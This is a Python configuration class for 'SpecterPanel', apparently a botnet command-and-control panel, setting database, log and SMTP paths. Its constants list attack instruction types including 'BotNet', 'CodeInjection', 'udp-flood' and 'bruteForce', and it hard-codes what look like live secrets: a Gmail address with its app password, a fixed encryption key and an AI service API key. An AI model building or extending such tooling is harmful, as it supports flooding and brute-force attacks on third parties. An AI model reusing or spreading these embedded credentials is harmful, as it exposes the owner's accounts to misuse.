# =========================================================================== #
# Author: Omer Kemal                                                          #
# Website: https://www.johndoe.com                                            #
# Social Media:                                                               #
#   - Facebook: https://www.facebook.com/johndoe                              #
#   - Telegram: https://t.me/johndoe                                          #
#   - Twitter: @JohnDoe                                                       #
#   - GitHub: https://github.com/johndoe                                      #
# =========================================================================== #

import sys
import os
import secrets
import string
import tempfile


class Setting:
    """
    The Setting class handles application-wide configurations such as:
    - Secure key generation
    - Logging and database paths
    - SMTP/email settings
    - Default flags and modes
    This version ensures safe handling across dev and PyInstaller builds.
    """

    def __init__(self):
        """
        Constructor to initialize all settings and prepare directories.
        Called automatically when `Setting()` is instantiated.
        """
        self.setting_var()
        self._initialize_paths()

    def _initialize_paths(self):
        """
        Ensures required directories for logs and database are created.
        """
        os.makedirs(self.LOG_DIR, exist_ok=True)
        os.makedirs(self.DB_DIR, exist_ok=True)

    def _resolve_path(self, relative_path):
        """
        Resolves an absolute path that works during both development and
        when running as a PyInstaller bundle.
        Args:
            relative_path (str): Path relative to project root or bundle.
        Returns:
            str: Absolute path resolved from base directory.
        """
        if hasattr(sys, '_MEIPASS'):  # PyInstaller bundled mode
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    def setting_var(self):
        """
        Initializes all configuration variables including:
        - Application secret key
        - Log and database paths
        - Email configuration
        - Other constants and flags
        """

        # Generate a strong secret key
        self.SECRAT_KEY = ''.join(
            secrets.choice(string.ascii_letters + string.digits)
            for _ in range(100)
        )

        # Use temp directory to ensure writable location (for PyInstaller)
        # self.APP_DIR = os.path.join(tempfile.gettempdir(), "SpecterPanel")

        # Set up directory structure
        # self.DB_DIR = os.path.join(self.APP_DIR, "db")
        # self.LOG_DIR = os.path.join(self.APP_DIR, "logs")
        self.DB_DIR = "db"
        self.LOG_DIR = "logs"

        # Logging configuration
        self.LOG_FILE_NAME = "log.txt"
        self.LOG_FILE_PATH = os.path.join(self.LOG_DIR, self.LOG_FILE_NAME)

        # Database configuration
        self.DB_NAME = "SpecterPanel.db"
        self.DB_URI = f"sqlite:///{os.path.join(self.DB_DIR, self.DB_NAME)}"

        # JSON file for user data or configuration
        self.JSON_FILE_PATH = os.path.join(self.DB_DIR, "info.json")

        # Admin email setup
        self.ADMIN_EMAIL = 'omerkemal2019@gmail.com'
        self.EMAIL_PASSWORD = 'vxoz uanm krad ukjh'  # TODO: Replace with env or config file
        self.EMAIL = 'omerkemal2019@gmail.com'
        self.SMTP_USE_TLS = True
        self.SMTP_LINK = 'smtp.gmail.com'
        self.SMTP_PORT = 587
        self.EMAIL_TYPE = "html"

        self.ENCRYPTION_KEY = b'W\xb7a\xab\xf7\xd9\xd2\xf0\x8b\xcb\xea\xc3\x93G\xbdS'  # TODO: Replace with a secure key

        # static file paths
        self.STATIC_DIR = "static/py"

        # Application behavior settings
        self.DELAY = 15  # Delay in seconds for instructions
        self.CHECK_UPDATE = ['checked', 'unchecked']
        self.CMD_CONDION = {True: "1", False: "0"}
        self.API_KEY_AI = "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"
        self.INSTRACTION = ['connectToWeb', 'connectBySocket', 'BotNet','codeInjection']
        self.INSTRACTION_TYPE = ['CMD','BotNet','CodeInjection','Web','Socket']
        self.INSTRACTION_BOTNET_CATEGORY = ['udp-flood','bruteForce']
        self.STUTAS = ['Active', 'Inactive']
        self.BOTNET_STATUS = ['pending','inprogrec','complit']
        self.ACTION_TYPE = ['udp-flood','socket','bruteForce']
        self.CONDEITION = ['pending','inprogrec','complit']

    def ID(self, n=5):
        """
        Generates a random alphanumeric ID of specified length.
        Args:
            n (int): Length of the ID (default is 5)
        Returns:
            str: A randomly generated ID
        """
        return ''.join(
            secrets.choice(string.ascii_letters + string.digits)
            for _ in range(n)
        )
